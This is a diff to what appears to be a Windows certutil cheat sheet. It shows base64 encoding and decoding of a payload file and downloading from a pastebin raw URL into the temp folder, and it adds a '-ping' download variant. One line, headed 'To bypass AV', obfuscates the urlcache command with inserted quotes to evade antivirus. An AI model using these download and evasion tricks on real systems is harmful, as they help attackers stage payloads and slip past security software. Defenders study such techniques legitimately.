@@ -4,8 +4,11 @@ certutil -encode payload.bin payload.txt
 # To decode back base64 into [fomat].file 
 certutil -decode payload.txt payload.bin
 
-# To download strings from raw http/https
+# Urlcache download strings from raw http/https
 certutil -f -urlcache https://pastebin.com/raw/foo123 %temp%\foo.txt
 
 # To bypass AV while using urlcache
 certutil -f -ur""""lc""""ache h""""t""""t""""ps:/""""/pastebin.com/raw/foo123 %temp%\foo.txt
+
+# Ping download strings from raw http/https
+certutil.exe -ping https://pastebin.com/raw/foo123 > foo.txt
